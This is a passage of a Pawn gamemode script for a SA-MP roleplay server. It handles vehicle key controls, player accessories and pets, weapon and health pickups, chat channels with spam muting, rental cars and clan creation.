		if !PlayerInfo[playerid][pJob] || PickupInfo[PlayerPickup[playerid]][pkType] != 5 *then return true;
		new j = PickupInfo[PlayerPickup[playerid]][pkID];
        if !PlayerToPoint(5.0, playerid, JobInfo[j][jPosX], JobInfo[j][jPosY], JobInfo[j][jPosZ]) *then return true;
        
        if IsPlayerInAnyVehicle(playerid) *then
            return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti aceasta comanda dintr-un vehicul!");
	            
        if !PlayerInfo[playerid][pJob] *then
        	return SendClientMessage(playerid, COLOR_LGREEN, "Nu ai un job.");

    	SCMf(playerid, -1, "You resigned from the %s job. Now you're unemployed.", JobInfo[PlayerInfo[playerid][pJob]][jName]);
    	PlayerInfo[playerid][pJob] = 0; UsedFind[playerid] = 0; targetfind[playerid] = -1; CP[playerid] = 0; JobWorking[playerid] = 0; BagTime[playerid] = 0;
		if(PlayerInfo[playerid][pShowProgress][1]) DestroyProgress(playerid, 1);
		CurseFacute[playerid] = 0;
		stopWork(playerid);

    	DisablePlayerRaceCheckpointEx(playerid); 
    	UpdateVar(playerid, "Job", 0); DisablePlayerCheckpointEx(playerid); PlayerTextDrawHide(playerid, FindTD); PlayerTextDrawHide(playerid, FindSkinTD); PlayerTextDrawHide(playerid, JobTD);
	}
    if(newkeys & KEY_JUMP) {
    	if GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_CUFFED *then ApplyAnimation(playerid, "GYMNASIUM", "gym_jog_falloff",4.1,0,1,1,0,0);
    }
	if(newkeys & KEY_HANDBRAKE) {
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK && PlayerInfo[playerid][pAdmin] < 1) {
			format(gString, 128, "AdmWarning: %s(%d) a primit kick deoarece are jetpack.",GetName(playerid),playerid);
			SendAdminMessage(COLOR_WARNING, gString, 1);
			KickEx(playerid);
		}
	}
    if(newkeys & KEY_LOOK_BEHIND) {
		new idcar = GetPlayerVehicleID(playerid), carid = FindSpawnID(idcar);
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
		if(DeelayCommand[playerid][7] > gettime()) return DeelayTime(playerid, 7);
		if(IsABike(GetVehicleModel(idcar))) return true;

		if(carid != -1) if(!CarInfo[carid][cPoints] && !CarInfo[carid][cClan]) return SendErrorMsg(playerid, "Acest vehicul nu are asigurarea platita!");
		if(Refueling[playerid]) return SendErrorMsg(playerid, "Te rugam sa astepti pana ce iti faci plinul!");
		if(!Gas[idcar]) return SendErrorMsg(playerid, "Acest vehicul nu are benzina.");
		if(!vehEngine[idcar] && editObjectType[playerid]) return SendErrorMsg(playerid, "Nu poti porni motoru in timp ce editezi vip-ul.");

		toggleVehicleParams(idcar, TOGGLE_VEH_ENGINE);		   

		ProxDetector(30.0, playerid, "* %s %s the engine of his %s.", COLOR_PURPLE, GetName(playerid), vehEngine[idcar]?"starts":"stops", GetVehicleName(GetVehicleModel(idcar)));
		if vehEngine[idcar] *then DeelayCommand[playerid][7] = gettime()+10;
	}
    if((newkeys & KEY_ANALOG_DOWN) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return toggleVehicleParams(GetPlayerVehicleID(playerid), TOGGLE_VEH_BOOT);
    if((newkeys & KEY_ACTION) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return toggleVehicleParams(GetPlayerVehicleID(playerid), TOGGLE_VEH_LIGHTS);
    if((newkeys & KEY_ANALOG_UP) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return toggleVehicleParams(GetPlayerVehicleID(playerid), TOGGLE_VEH_BONNET);
    return false;
}

stock login_accessory(playerid, number) {
	switch(number) {
		case 0: {
    		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    		else SetPlayerAttachedObject(playerid, 1, 19066, 2, 0.1639, 0.0300, -0.0029, -96.0000, 86.9000, -176.3997, 1.2400, 1.0930, 1.0390);
    	}//santa hat
    	case 1: {
    		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    		else SetPlayerAttachedObject(playerid, 1, 19528, 2, 0.1549, 0.0049, 0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000);
    	}//halloween hat
    	case 2: SetPlayerAttachedObject(playerid, 2, 19036, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 1
    	case 3: SetPlayerAttachedObject(playerid, 2, 18919, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 2
    	case 4: SetPlayerAttachedObject(playerid, 2, 18912, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 3
    	case 5: SetPlayerAttachedObject(playerid, 2, 18918, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 4
    	case 6: SetPlayerAttachedObject(playerid, 2, 18914, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 5
    	case 7: SetPlayerAttachedObject(playerid, 2, 18915, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 6
    	case 8: SetPlayerAttachedObject(playerid, 2, 18911, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 7
    	case 9: SetPlayerAttachedObject(playerid, 2, 11704, 2, 0.0760, 0.0989, -0.0130, 174.2000, 98.8000, 0.0000, 0.3760, 1.0000, 0.4790); //devil mask
    	case 10: SetPlayerAttachedObject(playerid, 5, 321, 6, 0.0320, 0.0100, -0.1719, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000); //dildo
    	case 11: SetPlayerAttachedObject(playerid, 5, 19878, 5, 0.0320, 0.0100, -0.1719, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000); //skateboard
    	case 12: SetPlayerAttachedObject(playerid, 2, 1242, 1, 0.0429, 0.0269, 0.0030, 0.0000, 89.0999, 0.0000, 1.8389, 2.2310, 1.7300); //body armour
    	case 13: SetPlayerAttachedObject(playerid, 8, 2406, 5, -0.0210, -0.0949, 0.0000, 0.0000, 86.0000, 0.0000, 1.0000, 1.0000, 1.0000); //surf board
    	case 14: SetPlayerAttachedObject(playerid, 2, 19142, 1, 0.0429, 0.0269, 0.0030, 0.0000, 89.0999, 0.0000, 1.8389, 2.2310, 1.7300); //police amour
    	case 15: {

    	}//mp3 guitar
    	case 16: SetPlayerAttachedObject(playerid, 5, 19081, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //pink laser
    	case 17: SetPlayerAttachedObject(playerid, 5, 19084, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //yellow laser
    	case 18: SetPlayerAttachedObject(playerid, 5, 18643, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //red laser
    	case 19: SetPlayerAttachedObject(playerid, 5, 19080, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //purple laser
    	case 20: SetPlayerAttachedObject(playerid, 5, 19082, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //orange laser
    	case 21: SetPlayerAttachedObject(playerid, 5, 19083, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //green laser
	}
}

stock attach_player_accessory(playerid) {
	switch(player_td_page[playerid]) {
    	case 0: {
    		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    		else SetPlayerAttachedObject(playerid, 1, 19066, 2, 0.1639, 0.0300, -0.0029, -96.0000, 86.9000, -176.3997, 1.2400, 1.0930, 1.0390);
    	}//santa hat
    	case 1: {
    		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    		else SetPlayerAttachedObject(playerid, 1, 19528, 2, 0.1549, 0.0049, 0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000);
    	}//halloween hat
    	case 2: SetPlayerAttachedObject(playerid, 2, 19036, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 1
    	case 3: SetPlayerAttachedObject(playerid, 2, 18919, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 2
    	case 4: SetPlayerAttachedObject(playerid, 2, 18912, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 3
    	case 5: SetPlayerAttachedObject(playerid, 2, 18918, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 4
    	case 6: SetPlayerAttachedObject(playerid, 2, 18914, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 5
    	case 7: SetPlayerAttachedObject(playerid, 2, 18915, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 6
    	case 8: SetPlayerAttachedObject(playerid, 2, 18911, 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000); //mask 7
    	case 9: SetPlayerAttachedObject(playerid, 2, 11704, 2, 0.0760, 0.0989, -0.0130, 174.2000, 98.8000, 0.0000, 0.3760, 1.0000, 0.4790); //devil mask
    	case 10: SetPlayerAttachedObject(playerid, 5, 321, 6, 0.0320, 0.0100, -0.1719, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000); //dildo
    	case 11: SetPlayerAttachedObject(playerid, 5, 19878, 5, 0.0320, 0.0100, -0.1719, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000); //skateboard
    	case 12: SetPlayerAttachedObject(playerid, 2, 1242, 1, 0.0429, 0.0269, 0.0030, 0.0000, 89.0999, 0.0000, 1.8389, 2.2310, 1.7300); //body armour
    	case 13: SetPlayerAttachedObject(playerid, 8, 2406, 5, -0.0210, -0.0949, 0.0000, 0.0000, 86.0000, 0.0000, 1.0000, 1.0000, 1.0000); //surf board
    	case 14: SetPlayerAttachedObject(playerid, 2, 19142, 1, 0.0429, 0.0269, 0.0030, 0.0000, 89.0999, 0.0000, 1.8389, 2.2310, 1.7300); //police amour
    	case 15: {

    	}//mp3 guitar
    	case 16: SetPlayerAttachedObject(playerid, 5, 19081, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //pink laser
    	case 17: SetPlayerAttachedObject(playerid, 5, 19084, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //yellow laser
    	case 18: SetPlayerAttachedObject(playerid, 5, 18643, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //red laser
    	case 19: SetPlayerAttachedObject(playerid, 5, 19080, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //purple laser
    	case 20: SetPlayerAttachedObject(playerid, 5, 19082, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //orange laser
    	case 21: SetPlayerAttachedObject(playerid, 5, 19083, 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000); //green laser
	}
}

stock deattach_player_accessory(playerid) {
	switch(player_td_page[playerid]) {
    	case 0: {
    		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    	}//santa hat
    	case 1: {
    		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    	}//halloween hat
    	case 2: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //mask 1
    	case 3: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //mask 2
    	case 4: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //mask 3
    	case 5: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //mask 4
    	case 6: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //mask 5
    	case 7: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //mask 6
    	case 8: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //mask 7
    	case 9: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //devil mask
    	case 10: if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5); //dildo
    	case 11: if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5); //skateboard
    	case 12: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //body armour
    	case 13: if(IsPlayerAttachedObjectSlotUsed(playerid, 8)) RemovePlayerAttachedObject(playerid, 8); //surf board
    	case 14: if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2); //police amour
    	case 15: {

    	}//mp3 guitar
    	case 16: if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5); //pink laser
    	case 17: if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5); //yellow laser
    	case 18: if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5); //red laser
    	case 19: if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5); //purple laser
    	case 20: if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5); //orange laser
    	case 21: if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5); //green laser
	}
}

stock attach_player_pet(playerid) {
	switch(PlayerInfo[playerid][pPet]) {
    	case 0: SetPlayerAttachedObject(playerid, 6, 19078, 17, 0.021065, -0.100726, 0.143000, 357.120239, 1.712298, 349.232513, 1.000000, 1.000000, 1.120420);
    	case 1: SetPlayerAttachedObject(playerid, 6, 1609, 17, 0.0700, -0.0029, -0.1509, 2.1000, 92.2000, -4.5999, 0.0859, 0.0659, 0.0839);
		case 2: SetPlayerAttachedObject(playerid, 6, 19833, 1, 0.3350, 0.0290, 0.1530, 0.0000, 87.8999, -170.9000, 0.2100, 0.1280, 0.1300);
		case 3: SetPlayerAttachedObject(playerid, 6, 11733, 1, 0.3260, 0.0000, 0.1590, -2.4999, 86.0000, 178.7000, 0.2490, 0.1490, 0.1490);
		case 4: SetPlayerAttachedObject(playerid, 6, 1608, 1, 0.3900, -0.0509, 0.1570, 0.7999, 88.3999, 5.2999, 0.0569, 0.0279, 0.0440);
		case 5: SetPlayerAttachedObject(playerid, 6, 18248, 1, 0.4589, 0.1309, 0.0480, 175.9001, 90.2999, 0.0000, 0.0259, 0.0199, 0.0160);
		case 6: SetPlayerAttachedObject(playerid, 6, 902, 1, 0.3109, -0.0060, 0.1469, -2.0999, 85.8999, -23.6000, 0.1190, 0.1230, 0.1330);
		case 7: SetPlayerAttachedObject(playerid, 6, 2061, 1, 0.4180, 0.0000, 0.1470, 6.9000, 80.5999, 0.0000, 0.3310, 0.3540, 0.2520);
		case 8: SetPlayerAttachedObject(playerid, 6, 19320, 1, 0.4180, 0.0000, 0.1470, 6.9000, 80.5999, 0.0000, 0.3310, 0.3540, 0.2520);//pumpkin
		case 9: SetPlayerAttachedObject(playerid, 6, 19054, 1, 0.4180, 0.0000, 0.1470, 6.9000, 80.5999, 0.0000, 0.3310, 0.3540, 0.2520);//xmas 1
		case 10: SetPlayerAttachedObject(playerid, 6, 19055, 1, 0.4180, 0.0000, 0.1470, 6.9000, 80.5999, 0.0000, 0.3310, 0.3540, 0.2520);//xmas 2
		case 11: SetPlayerAttachedObject(playerid, 6, 1851, 1, 0.4180, 0.0000, 0.1470, 6.9000, 80.5999, 0.0000, 0.3310, 0.3540, 0.2520);//limited edition 1
		case 12: SetPlayerAttachedObject(playerid, 6, 1247, 1, 0.4180, 0.0000, 0.1470, 6.9000, 80.5999, 0.0000, 0.3310, 0.3540, 0.2520);//limited edition 2
		case 13: SetPlayerAttachedObject(playerid, 6, 645, 1, 0.4180, 0.0000, 0.1470, 6.9000, 80.5999, 0.0000, 0.3310, 0.3540, 0.2520);//palm
	}
}
new const name_pet[][] = {"Parrot", "Turtle", "Cow", "Pony", "Shark", "Special", "Star", "Shell", "Pumpkin", "Xmas #1", "Xmas #2", "limited edition #1", "limited edition #2", "Palm"};
new const level_pet[] = {1, 5, 10, 15, 20, 21, 25, 30, 0, 0, 0, 0, 0, 0};
new const special_pet_name[][] = {"Pumpkin", "Xmas #1", "Xmas #2", "limited edition #1", "limited edition #2", "Palm"};

redist::give_rob_wanted(playerid) {
	PlayerInfo[playerid][pWantedLevel] = 6;
	SetPlayerWantedLevel(playerid, 6);
	UpdateVar(playerid, "WantedLevel", 6);
	new cop=p_rob[playerid][r_coPlayer];
	if p_rob[playerid][r_coPlayer] !=-1 *then {
		PlayerInfo[cop][pWantedLevel] = 6;
		SetPlayerWantedLevel(cop, 6);
		UpdateVar(cop, "WantedLevel", 6);
		SetPlayerCriminal(playerid, -1, "armed robbery", PlayerInfo[cop][pUsername]);
		SetPlayerCriminal(cop, -1, "armed robbery", PlayerInfo[playerid][pUsername]);
	} else SetPlayerCriminal(playerid, -1, "armed robbery");
}

public OnPlayerPickUpDynamicPickup(playerid, pickupid) {
	PlayerPickup[playerid] = pickupid;
	if(InWarTurf[PlayerInfo[playerid][pMember]] == -1) return true;
	switch(Pickups[pickupid][psType]) {
		case 1: {
			SendClientMessage(playerid, COLOR_YELLOW, "You pickuped up 20HP from the ground.");
			new Float:HP;
			GetPlayerHealthEx(playerid,HP);
			SetPlayerHealthEx(playerid,HP+20);
			if(HP>99) SetPlayerHealthEx(playerid, 99);
			format(gString, 128, "* %s picked up 20HP from the ground.", GetName(playerid));
			ProxDetector(20.0, playerid, gString, COLOR_PURPLE);
		}
		case 2: {
			new gunname[32]; gString[0] = (EOS);
			GetWeaponName(Pickups[pickupid][psWeapon], gunname, sizeof(gunname));
			SCMf(playerid, COLOR_YELLOW, "You picked up a weapon from the ground. (%s, %d ammo).", gunname, Pickups[pickupid][psAmmo]);
			ServerWeapon(playerid, Pickups[pickupid][psWeapon], Pickups[pickupid][psAmmo]);
			format(gString, 128, "* %s picked up a weapon from the ground (%s)", GetName(playerid), gunname);
			ProxDetector(20.0, playerid, gString, COLOR_PURPLE);
		}
		default: return true;
	}
	DestroyDynamicPickup(pickupid);
	Pickups[pickupid][psType] = 0;
	Pickups[pickupid][psID] = 0;
	Pickups[pickupid][psWar] = 0;
	Pickups[pickupid][psAmount] = 0;
	PlayerPlaySound(playerid, 1150, 0.0, 0.0, 10.0);	
    return true;
}					

public OnPlayerText(playerid, text[]) {

	if(!IsPlayerLogged(playerid)) 
		return false;	

	if(FaceReclama(text)) return Reclama(playerid, text),0;	
	if(LastTextTime[playerid] >= GetTickCount() && !IsAdmin(playerid, 1)) {
    	TextCount[playerid]++;
    	if(TextCount[playerid] > 5) {
    		PlayerInfo[playerid][pMuted] = 1;
			PlayerInfo[playerid][pMuteTime] += 15;
			PlayerTextDrawHide(playerid, ChatCMD);
			PlayerInfo[playerid][pChatCMD] = 11;
    		TextCount[playerid] = 0;
    		mysql_format(SQL,gQuery,256,"UPDATE users SET `Muted`='1',`MuteTime`='%i' WHERE `id`='%i'", PlayerInfo[playerid][pMuteTime], PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL,gQuery);
    		SendClientMessage(playerid, COLOR_GREY, "You have been auto-muted for spamming. You will be unmuted in 15 seconds.");
    		return 0;
    	}
    } 
	LastTextTime[playerid] = GetTickCount() + 1000*3;
    if(TrivalEvent != 0) {
		if compare(text, TrivalText) *then {
			GivePlayerCash(playerid, TrivalPremium);
			format(gString, 256, "(( AdmBot: %s a castigat evenimentul de tip 'Trivia' deoarece a scris primul '%s' in chat si a primit suma de $%s. Felicitari!", GetName(playerid), TrivalText, FormatNumber(TrivalPremium));
			sendSplittedMessage(COLOR_CLIENT, gString);
			TrivalEvent = 0;
			return false;
		}
	}
    switch PlayerInfo[playerid][pChatCMD] do {
    	case 0: {//kkt
    		if(!IsAdmin(playerid,1)&&!IsHelper(playerid,1)&&!PlayerInfo[playerid][pLeader]) {
    			switch(PlayerInfo[playerid][pTag]) {
    				case -1: format(gString, 144, "{%s}%s: {FFFFFF}%s", PlayerColors(playerid), GetName(playerid),text);
					case 0: format(gString, 144, "{%s}%s%s: {FFFFFF}%s", PlayerColors(playerid), ClanInfo[PlayerInfo[playerid][pClan]][clTag], PlayerInfo[playerid][pUsername], text);
					case 1: format(gString, 144, "{%s}%s%s: {FFFFFF}%s", PlayerColors(playerid), PlayerInfo[playerid][pUsername], ClanInfo[PlayerInfo[playerid][pClan]][clTag], text);
				}
    		} else {
    			switch(PlayerInfo[playerid][pTag]) {
    				case -1: format(gString, 144, "{%s}%s%s: {FFFFFF}%s", PlayerColors(playerid), TotalUserSymbol(playerid), GetName(playerid),text);
					case 0: format(gString, 144, "{%s}%s%s%s: {FFFFFF}%s", PlayerColors(playerid), TotalUserSymbol(playerid), ClanInfo[PlayerInfo[playerid][pClan]][clTag], PlayerInfo[playerid][pUsername], text);
					case 1: format(gString, 144, "{%s}%s%s%s: {FFFFFF}%s", PlayerColors(playerid), TotalUserSymbol(playerid), PlayerInfo[playerid][pUsername], ClanInfo[PlayerInfo[playerid][pClan]][clTag], text);
				}
    		}
    		ProxDetector(20.0, playerid, gString, COLOR_WHITE);
    		SetPlayerChatBubble(playerid, text, COLOR_CHATBUBBLE, 10.0, 10000);
			ChatLog(playerid, "(chat) %s", text);
    	}
    	case 1: return callcmd::wt(playerid, text),0;
    	case 2:	return callcmd::cw(playerid, text),0;
    	case 3: return callcmd::clanchat(playerid, text),0;
    	case 4: return callcmd::f(playerid, text),0;
    	case 5: return callcmd::pc(playerid, text),0;
    	case 6: return callcmd::vc(playerid, text),0;
    	case 7: return callcmd::rb(playerid, text),0;
    	case 8: return callcmd::lc(playerid, text),0;
    	case 9: {
			format(gString, 144, "(cellphone) %s says: %s", GetName(playerid), text);
			ProxDetector(20.0, playerid, gString, COLOR_FADE1);
			if(IsPlayerConnected(Mobile[playerid])) {
			    if(Mobile[Mobile[playerid]] == playerid) {
					if(PlayerInfo[Mobile[playerid]][pSpeaker] == 1) ProxDetector(20.0, Mobile[playerid], gString, COLOR_FADE1);
					else SendClientMessage(Mobile[playerid], COLOR_YELLOW, gString);
				}
			}
			InsertLog(playerid, gString, LOG_CHAT);	
			return false;
    	}
    	case 10: {
			return OOCNews(COLOR_LIGHTGREEN, "%s %s: %s", PlayerInfo[playerid][pMember] == 9 ?("{FFABFC}Reporter{9ACD32}"):("Liveplayer"), GetNameEx(playerid), text),0;
    	}
    	case 11: return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]),0;
    	case 12: {
    		SetPlayerChatBubble(playerid, text, COLOR_CHATBUBBLE, 10.0, 10000);
    		return SendPaintMessage(PaintType[playerid], -1, "{5088BF}%s [%d kills]: {FFFFFF}%s", GetNameEx(playerid), PKills[playerid], text),0;
    	}
    	case 13: {
    		new id = Spectate[playerid];
    		format(gString, 144, "{%s}%s%s: {FFFFFF}%s", PlayerInfo[playerid][pColor] != 0 ? PlayerColors(playerid) : "BA0404", TotalUserSymbol(playerid), GetNameEx(playerid), text);
    		ProxDetector(20.0, id, gString, COLOR_WHITE);
    		if(!Iter_Contains(StreamedPlayer[id], playerid)) SendClientMessage(playerid, -1, gString);
			ChatLog(playerid, "(chat) %s", text);
    	}
    	case 14: {
    		ProxDetector(20.0, playerid, "{CECECE}%s: {FFFFFF}%s", COLOR_WHITE, GetName(playerid), text);
    		SetPlayerChatBubble(playerid, text, COLOR_CHATBUBBLE, 10.0, 10000); ChatLog(playerid, "(chat) %s", text);
    	}
    }
	return false;
}


cmd:createclanzone(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 7)
		return SendClientMessage(playerid, COLOR_GREY, AdminOnly);

	new Float: Pos[3];
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	new obj;
	obj = CreateDynamicObject(19353, Pos[0], Pos[1]+3, Pos[2], 0, 0, 0);
	SetDynamicObjectMaterialText(obj, 0, "none\n[none]", OBJECT_MATERIAL_SIZE_512x256, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
	EditDynamicObject(playerid, obj);
	editObjectType[playerid] = 2;
	return true;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2) {
    SetVehicleColor(vehicleid);
	SetVehicleHealth(vehicleid, 999);
	return true;
}

public OnVehicleDeath(vehicleid) {
	if(FindSpawnID(vehicleid) != -1) {
		new carid = FindSpawnID(vehicleid);
		if(CarInfo[carid][cPoints] >= 1) CarInfo[carid][cPoints] -= 1;
		CarInfo[carid][cLastPos][0] = CarInfo[carid][cLocationx];
		CarInfo[carid][cLastPos][1] = CarInfo[carid][cLocationy];
		CarInfo[carid][cLastPos][2] = CarInfo[carid][cLocationz];						
		CarInfo[carid][cTax] += 30 + random(10);

		_query("UPDATE `cars` SET `Points`='%d', `Tax`='%d' WHERE `ID`='%d'", CarInfo[carid][cPoints], CarInfo[carid][cTax], CarInfo[carid][cID]);
		DestroyPlayerCar(carid);	
	}
	new playerid = vehiclePlayerID[vehicleid];
	if playerid!=INVALID_PLAYER_ID *then {
		if p_rob[playerid][r_in_rob] *then
			stop_rob(playerid, 1);
	}

 	new engine,lights,alarm,doors,bonnet,boot,objective;
 	vehEngine[vehicleid] = 0;
	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
 	SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
	StopAudioStreamForPlayersInCar(vehicleid);
 	return true;
}
Save_VipCoordonat(idd) {
	gQuery[0] = EOS;
	mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `Cordonate`='%.2f %.2f %.2f %.2f %.2f %.2f' WHERE `ID`='%i'", CarInfo[idd][cVipPos][0], CarInfo[idd][cVipPos][1], CarInfo[idd][cVipPos][2], CarInfo[idd][cVipPos][3], CarInfo[idd][cVipPos][4], CarInfo[idd][cVipPos][5], CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery, "", "");
}
stock create_rent_car(playerid, model, bool:put=false) {
	new Float:x,Float:y,Float:z,Float:rot;
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, rot);
	VehicleRent[playerid] = CreateVehicleEx(model, x+random(2), y+random(2), z, rot, -1, -1);
	Gas[VehicleRent[playerid]] = 100;
	SetVehicleNumberPlate(VehicleRent[playerid], "Rent Car");
	GivePlayerCash(playerid, -2000);
	vehiclePlayerID[VehicleRent[playerid]] = playerid;
	SetVehicleVirtualWorld(VehicleRent[playerid], GetPlayerVirtualWorld(playerid));
	if(!put) PutPlayerInVehicleEx(playerid, VehicleRent[playerid], 0);
	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(VehicleRent[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(VehicleRent[playerid],engine,lights,alarm,true,bonnet,boot,objective);
	GiveVehicleKey(playerid, VehicleRent[playerid]);
	return true;
}
stock destroy_rent_car(playerid) {
	if(!VehicleRent[playerid]) return true;
	switch(GetVehicleModel(VehicleRent[playerid])) {
		case 426: RentStock[0] ++;
		case 506: RentStock[1] ++;
		case 560: RentStock[2] ++;
		case 480: RentStock[3] ++;
		case 550: RentStock[4] ++;
		case 522: RentStock[5] ++;
		case 521: RentStock[6] ++;
		case 461: RentStock[7] ++;
		case 481: RentStock[8] ++;
		case 510: RentStock[9] ++;
	}
	DestroyVehicleEx(VehicleRent[playerid], "");
	VehicleRent[playerid] = 0;
	return true;
}

redist::SQL_INSERT_CLAN(playerid, const inputtext[], const szDate[]) {
	new i=cache_insert_id();
	ClanInfo[i][clSlots] = sSlot[playerid];
	format(ClanInfo[i][clName], 64, inputtext);
	format(ClanInfo[i][clOwner], 24, PlayerInfo[playerid][pUsername]);
	format(ClanInfo[i][clRegisterDate], 70, szDate);
	format(ClanInfo[i][clColor], 10, "FFFFFF");
	ClanInfo[i][cID] = i;
	ClanID[sql_clans++] = i;
	ClanMembers[i] ++;
	PlayerInfo[playerid][pClan] = i;
	Iter_Add(clan_players<i>, playerid);
	PlayerInfo[playerid][pClanRank] = 7;
	ClanInfo[i][clDays]	= 60;
